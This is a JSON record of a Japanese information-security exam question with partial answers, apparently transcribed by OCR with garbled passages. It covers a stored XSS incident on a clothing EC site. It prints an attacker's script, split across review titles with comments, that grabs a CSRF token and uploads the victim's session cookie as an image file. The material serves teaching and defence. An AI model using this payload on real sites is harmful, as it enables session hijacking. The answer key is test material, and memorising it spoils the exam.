@@ -1,0 +1,93 @@
+{
+  "id": "2023-05",
+  "era_label": "令和5年度 秋 問1",
+  "problems": [
+    {
+      "problem": "問1",
+      "title": "Webアプリケーションプログラムの開発",
+      "items": [
+        {
+          "type": "text",
+          "content": "Q社は，洋服のEC事業を手掛ける従業員 100名の会社である。WebアプリのというWeb アプリケーションプログラムでECサイトを運営している。ECサイトのドメイン名は“ロロロ.co.jp”であり，利用者は WebアプリにHTTPS でアクセスする。Webアプリの開発と運用は、Q社開発部が行っている。今回、Webアプリ 0に，ECサイトの会員による商品レビュー機能を追加した。図1は、Webアプリの主な機能である。"
+        },
+        {
+          "type": "text",
+          "content": "1. 会員登録機能ECサイトの会員登録を行う。\n2. ログイン機能会員IDとパスワードで会員を認証する。ログインした会員には、セッション IDを cookieとして払い出す。\n3．カートへの商品の追加及び削除機能（省略）4.商品の購入機能ログイン済み会員だけが利用できる。\n（省略）5.商品レビュー機能商品レビューを投稿したり閲覧したりするページを提供する。商品レビューの投稿は、ログイン済み会員だけが利用できる。会員がレビューページに入力できる項目のうち、レビュータイトルとレビュー詳細の欄は自由記述が可能であり、それぞれ 50字と 300字の入力文字数制限を設けている。\n6.会員プロフィール機能アイコン画像をアップロードして設定するためのページ（以下、会員プロフィール設定ページという）や、クレジットカード情報を登録するページを提供する。どちらのページもログイン済み会員だけが利用できる。アイコン画像のアップロードは、次をパラメータとして、“https://0ロロ.co.jp/user/upload”に対して行う。\n・画像ファイル ”）・ “https://0ロロ.co.jp/user/profile”にアクセスして払い出されたトークン？）パラメータのトークンが、 “https://ロロロ.co.jp/user/profi le”にアクセスして払い出されたものと一致したときは、アップロードが成功する。アップロードしたアイコン画像は、会員プロフィール設定ページや、レビューページに表示される。\n（省略）\"uploadfile” である。\n注 1）パラメータ名は、注2）パラメータ名は、\"token” である。\n図1 Webアプリ Qの主な機能"
+        },
+        {
+          "type": "text",
+          "content": "ある日、会員から、無地Tシャツのレビューページ（以下，ページVという）に16件表示されるはずのレビューが2件しか表示されていないという問合せが寄せられた。\n開発部のリーダーであるNさんがページVを閲覧してみると、画面遷移上おかしな点はなく、図2が表示された。"
+        },
+        {
+          "type": "text",
+          "content": "商品レビュー無地Tシャツレビューを投稿する★ 4.9 16件のレビュー会員A2023年4月10日★★★★★ GoodNice shirt！会員B2023年4月1日★★★★形も素材も良いサイズ感がぴったりフィットして気に入っています（>_＜）手触りも良く、値段を考えると良い商品です。\n以上、全16件のレビュー注記は、会員がアイコン画像をアップロードしていない場合に表示される画像である。\n図2 ページV"
+        },
+        {
+          "type": "text",
+          "content": "Web アプリののレビューページでは、次の項目がレビューの件数分表示されるはずである。\n・レビューを投稿した会員のアイコン画像・レビューを投稿した会員の表示名・レビューが投稿された日付・レビュー評価（1~5個の★）・会員が入力したレビュータイトル・会員が入力したレビュー詳細"
+        },
+        {
+          "type": "text",
+          "content": "不審に思ったNさんはページVのHTMLを確認した。図3は、ページVのHTMLである。"
+        },
+        {
+          "type": "text",
+          "content": "（省略）<div class=\"review-number”>16件のレビュー＜/div＞<div class=\"review”><div class=” icon”><img src=”/users/dac6c8f12+867ed5/icon.png”></div><div class=\"displayname”＞会員 A/div><div class=\"date”>2023年4月10日く/divx<div class=\"star\"＞★★★★★＜/div＞<div class=\"review-tit le”＞Good<script＞xhr=new XMLHttpRequest （；/*</div><div class=\"description”>a/div>＜/div><div class=\"review”><div class=\"icon”><img src=\"/users/dac6c8f12+867ed5/icon.png”></div><div class=\"displayname”＞会員 AK/div><div class=\"date”>2023年4月10日く/divx<div class=\"star\">★★★★★＜/div＞<div class=\"review-title”>*/url1=\"https://00.co.jp/user/protile”：/*</div><div class=\"description”＞a/div></div＞（省略）<div class=\" review”><div class=\"icon”>＜img src=\"/users/dac6c8f12f867ed5/icon.png”></div＞<div class=\"displayname”＞会員 A/div><div class=\"”date”>2023年4月10日/divy<div class=\"star”＞★★★★★＜/div＞<div class=\"review-title\">*/xhr2. send （form）；J/script＞/div＞<div class=\"description”>Nice shirt！</div></div><div class=\"'review”><div class=\"icon\">＜img src=\"/users/94774f6887f73b91/icon. png”＞＜/div＞<div class=\"displayname”＞会員Bく/div><div class=”date”>2023年4月1日</divy<div class=\"star”>★★★★＜/div＞<div class=\"review-title”＞形も素材も良いく/div＞<div class=\"description”＞サイズ感がぴったりフィットして気に入っています（&gt；_&lt；）くbr>手触りも良く，値段を考えると良い商品です。</div＞</div＞<div classe\"review-end”＞以上，全16件のレビューく/div＞（省略）図3 ページVのHTML"
+        },
+        {
+          "type": "text",
+          "content": "図3のHTMLを確認したNさんは、会員Aによって15件のレビューが投稿されていること、及びページVには長いスクリプトが埋め込まれていることに気付いた。Nさんは、ページVにアクセスしたときに生じる影響を調査するために、アクセスしたときに Webブラウザで実行されるスクリプトを抽出した。図4は、Nさんが抽出したスクリプトである。"
+        },
+        {
+          "type": "dialogue",
+          "lines": [
+            {
+              "speaker": "1",
+              "text": "xhr = new XMLHttpRequest（）；2: urll = \"https://000.co.jp/user/profile”；3: xhr.open（\"get\"， url1） ；4: xhr. responseType = \"document”； //レスポンスをテキストではなくDOMとして受する。"
+            },
+            {
+              "speaker": "5",
+              "text": "xhr. send（）；6: xhr.onload = function（）｛1/ 以降は、1回目の XMLHttpRequest （XHR）のレスポンスの受に成功してから実行される。\npage = xhr. response；7：token = page.getElementById（”token\"）. value；8：9：xhr2 = new XMLHttpRequestO）；url2 = \"https://00.co.jp/user/upload”；10：xhr2.open（”\"post”， uri2）；11：form = new FormData（）；12：cookie = document. cookie；13：fname = \"a.png”；14：ftype = \" image/png”：15：file = new File（Lcookie］， fname, ftype: ftype｝）；16：// アップロードするファイルオブジェクト// 第1引数：ファイルコンテンツ11第2引数：ファイル名11第3引数：MIME タイプなどのオプションform.append （”uploadfile”， file） ；17：form. append （”token””， token）；18：xhr2. send （form） ；19：20：スクリプトの整形とコメントの追記は、Nさんが実施したものである。\n注記図4 Nさんが抽出したスクリプト"
+            }
+          ]
+        },
+        {
+          "type": "text",
+          "content": "脆弱性を悪用しNさんは、会員 Aの投稿はクロスサイトスクリプティング（XSS）た攻撃を成立させるためのものであるという疑いをもった。NさんがWebアプリロを調べたところ、Webアプリ Qには、会員が入力したスクリプトが実行されてしまう脆弱性があることを確認した。加えて、Web アプリがcookie に Httponly属性を付与していないこと及びアップロードされた画像ファイルの形式をチェックしていない：ことも確認した。\nQ社は、必要な対策を施し、会員への必要な対応も行った。"
+        },
+        {
+          "type": "text",
+          "content": "設問1 この攻撃で使われた XSS 弱性について答えよ。\n（1） XSS 弱性の種類を解答群の中から選び、記号で答えよ。\n解答群イ 格納型 XSSア DOM Based XSSウ 反射型 XSS（2） WebアプリQにおける対策を、30字以内で答えよ。\n設問2 図3について、入力文字数制限を超える長さのスクリプトが実行されるようにした方法を、50字以内で答えよ。\n設問3 図4のスクリプトについて答えよ。\n（1） 図4の6～20行目の処理の内容を、60字以内で答えよ。\n（2） 攻撃者は、図4のスクリプトによってアップロードされた情報をどのようにして取得できるか。取得する方法を、50字以内で答えよ。\n（3） 攻撃者が（2）で取得した情報を使うことによってできることを、40字以内で答えよ。\n設問4 仮に、攻撃者が用意したドメインのサイトに図4と同じスクリプトを含むHTMLを準備し、そのサイトに Webアプリのログイン済み会員がアクセスしたとしても、Web ブラウザの仕組みによって攻撃は成功しない。この仕組みを，40字以内で答えよ。"
+        }
+      ]
+    }
+  ],
+  "explanations": [
+    {
+      "problem": "問1",
+      "title": "WebアプリXSS脆弱性によるインシデント対応",
+      "items": [
+        {
+          "label": "設問1(1)",
+          "answer": "イ（XSSの種類）",
+          "explanation": "格納型XSS（Stored XSS）。攻撃者がレビューや投稿フォームに悪意あるスクリプトを書き込むことで、他のユーザが閲覧した際にスクリプトが実行される。反射型XSSと異なり、URLを踏ませる必要がなく被害規模が大きい。"
+        },
+        {
+          "label": "設問1(2)",
+          "answer": "レビュータイトルを出力する前にエスケープ処理を施す",
+          "explanation": "HTMLエスケープによるXSS対策の基本。< > & \" ' を対応する文字参照（&lt; &gt; &amp; &quot; &#39;）に変換する。テンプレートエンジンの自動エスケープ機能を使うか、出力コンテキストに応じたエスケープ関数を使用する。"
+        },
+        {
+          "label": "設問2",
+          "answer": "HTMLがコメントアウトされ一つのスクリプトになるような投稿を複数回に分けて行った",
+          "explanation": "XSSフィルター迂回技術。入力フィールドの文字数制限をバイパスするために、複数のコメントを組み合わせてスクリプトを完成させる分割投稿技術。WAFやCSP（Content-Security-Policy）による多層防御が有効。"
+        },
+        {
+          "label": "設問3(1)",
+          "answer": "XHRのレスポンスから取得したトークンとともに、アイコン画像としてセッションIDをアップロードする",
+          "explanation": "CSRFトークンを回避したCSRF攻撃の手法。同一オリジンポリシーで保護されたCSRFトークンをXHR（XMLHttpRequest）で事前に取得し、次のリクエストに含めることで正規ユーザを装う。XSSと組み合わせることで可能になる。"
+        }
+      ]
+    }
+  ]
+}
